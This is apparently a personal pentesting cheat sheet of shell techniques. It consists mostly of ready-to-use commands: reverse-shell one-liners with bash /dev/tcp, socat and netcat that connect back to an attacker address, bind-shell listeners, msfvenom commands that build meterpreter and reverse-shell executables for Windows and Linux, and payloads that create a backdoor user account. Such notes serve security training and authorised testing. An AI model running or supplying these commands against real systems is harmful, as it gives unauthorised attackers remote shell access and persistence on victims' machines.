# Shells
## Reverse Shell
- ### Bash
	#### Attacker
		nc -lnvp <PORT>								
	#### Remote
		bash -i >& /dev/tcp/<LOCAL_IP>/<PORT> 0>&1	
- ### SoCat
	#### Attacker
		socat -d -d TCP4-LISTEN:4443 STDOUT
	#### Remote
		socat TCP4:192.168.168.1:4443 EXEC:/bin/bash
		socat TCP4:192.168.168.1:4443 EXEC:'cmd.exe',pipes
- ### NetCat
	#### Attacker
		nc -lnvp <PORT>							
	#### Remote
		which bash
		
		nc -nv <LOCAL_IP> <PORT> -e <BASH_PATH> 

## Bind Shell 
- ### SoCat
	#### Remote
		socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash
		socat -d -d TCP4-LISTEN:4443 EXEC:'cmd.exe',pipes
	#### Attacker
		socat - TCP4:192.168.1.1:4443
- ### NetCat
	#### Remote
		which bash 	
		nc -lnvp <PORT> -e <BASH_PATH>	
	#### Attacker
		nc -nv <LOCAL_IP> <PORT>		
	#### Notes
	- People can connect to us
	- Firewalls can restrict inbound traffic
	- NAT/PAT can change IP address / port
	
## MSFVenom
- ### Shells
			nc -lnvp <PORT>
			msfvenom -p <PAYLOAD> LHOST=<LOCAL_IP> LPORT=<PORT> -f <FORMAT> -b <BAD_CHARS> [-a <PLATFORM> -e <ENCODE>]
	- #### Common Payloads
		- ##### Windows
					msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<PORT> -f exe > reverse.exe
					msfvenom -p windows/shell/reverse_tcp LHOST=<LOCAL_IP> LPORT=<PORT> -f exe > reverse.exe
		- ##### Linux
					msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<PORT> -f elf > reverse.elf
					msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<PORT> -f elf > shell.elf

	- #### Options
			msfvenom -l payloads, encoders, formats, platforms

- ### Create User
		msfvenom -p windows/adduser USER=kali PASS=kali -f exe > adduser.exe
		msfvenom -p linux/<ARCH>/adduser USER=kali PASS=kali -f elf > adduser.elf
	
## Web Shells
### Shell Specific Commands
	- #### cmd
	- #### PowerShell
			Get-Help

#### TODO
- Bind Shell Bash
- Web Shells

#### Links
Persistence: [[3.0 Persistence]]
	
#### Tags
#shell #revshell #msfvenom
			